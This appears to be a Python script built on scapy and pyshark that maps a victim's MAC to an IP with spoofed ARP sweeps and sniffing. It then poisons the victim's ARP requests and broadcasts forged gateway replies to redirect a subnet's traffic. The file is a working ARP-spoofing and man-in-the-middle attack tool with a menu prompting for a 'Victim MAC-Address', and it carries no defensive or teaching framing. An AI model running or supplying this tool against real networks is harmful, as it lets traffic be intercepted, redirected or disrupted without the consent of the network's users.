import time

import pyshark
from scapy.all import srp
from scapy.arch import get_if_addr
from scapy.data import ETHER_BROADCAST
from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import Ether, ARP
import os
import multiprocessing
import socket

from scapy.sendrecv import send, sendp

interface = "\\Device\\NPF_{4186B5FC-9B56-40E4-AD57-6E1835174B67}"
interfaceeth = "\\Device\\NPF_{74953FAE-2A5B-48FE-AFA0-8E4B663A3EBE}"


def search_ip():
    for network in range(74, 79):
        print("Searching range 172.17." + str(network) + ".0/24")
        pk_list = []
        for host in range(1, 253):
            ip = "172.17." + str(network) + "." + str(host)
            pk_list.append(Ether(dst=ETHER_BROADCAST, src="") / ARP(op=1, pdst=ip, psrc="172.19.79.254"))

        sendp(pk_list, iface=interface, verbose=False)


def detect_arp(mac):
    capture = pyshark.LiveCapture(interface=interface,
                                  display_filter="arp.opcode == 2 and eth.dst == 70:66:55:E2:9D:7B")
    table = {}

    with open("discovered.txt", "a") as file:
        while 1:
            for packet in capture.sniff_continuously(packet_count=2000):
                if packet.arp.src_hw_mac not in table:
                    table[packet.arp.src_hw_mac] = packet.arp.dst_proto_ipv4
                    file.write(packet.arp.src_hw_mac + " - " + packet.arp.src_proto_ipv4 + "\n")
                    file.flush()

                    if mac == packet.arp.src_hw_mac:
                        print("Found IP to MAC: " + packet.arp.src_proto_ipv4)
                        break


def watch_for_host(mac_addr):
    capture = pyshark.LiveCapture(interface=interface,
                                  display_filter="arp and arp.src.hw_mac == " + mac_addr)

    table = {}

    print("Waiting for host to show up...")

    while 1:
        for packet in capture.sniff_continuously(packet_count=10):
            ip = packet.arp.src_proto_ipv4
            mac = packet.arp.src_hw_mac

            if mac not in table:
                table[mac] = ip
                if mac == mac_addr:
                    print("New host with MAC " + mac + " connected with IP " + ip)
                    break


def auto_spoof(mac):
    capture = pyshark.LiveCapture(interface=interface,
                                  display_filter="arp.opcode == 1 and arp.src.hw_mac == " + mac + " and arp.dst.hw_mac == 44:1e:a1:9b:a0:00")

    while 1:
        for packet in capture.sniff_continuously(packet_count=1):
            ip = packet.arp.src_proto_ipv4
            m = packet.arp.src_hw_mac
            print("Host trying to get MAC -> Poisoning request ")
            send_arp(ip, "172.17.79.254", m, "70:66:55:E2:9D:7B")
            send_arp(ip, "172.17.79.254", m, "70:66:55:E2:9D:7B")


def send_arp(dst_ip, src_ip, dst_mac, src_mac):
    ps = Ether(dst=dst_mac, src=src_mac) / ARP(op=2, pdst=dst_ip, psrc=src_ip, hwsrc=src_mac, hwdst=dst_mac)
    sendp(ps, iface=interface, verbose=False)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print("1) Search for specific IP by MAC")
    print("2) Watch for specific MAC when connecting newly (undercover, takes more time)")
    print("3) Auto-Spoof MAC")
    print("4) Spoof Host")
    print("5) Redirect network traffic to one host")
    mode = int(input("Input: "))

    if mode != 4:
        search_mac = input("Victim MAC-Address: ")

    if mode == 1:
        p = multiprocessing.Process(target=search_ip, name="Pinging Hosts")
        p2 = multiprocessing.Process(target=detect_arp, name="Detect ARP packets", args=(search_mac,))

        p.start()
        p2.start()
    elif mode == 2:
        p3 = multiprocessing.Process(target=watch_for_host, name="Watch for specific MAC when connecting",
                                     args=(search_mac,))
        p3.start()
    elif mode == 3:
        p4 = multiprocessing.Process(target=auto_spoof, name="", args=(search_mac,))
        p4.start()
    elif mode == 4:
        print("Not implemented yet!")
    elif mode == 5:
        tmac = input("Target MAC: ")
        try:
            while 1:
                print("Send ARP...")
                send_arp("172.17.79.255", "172.17.79.254", "FF:FF:FF:FF:FF:FF", "40:66:55:E2:9D:7B")
                time.sleep(0.1)
        except:
            for i in range(0, 10):
                print("Cleaning up ARP Cache...")
                send_arp("172.17.79.255", "172.17.79.254", "FF:FF:FF:FF:FF:FF", "44:1e:a1:9b:a0:00")
                time.sleep(0.5)
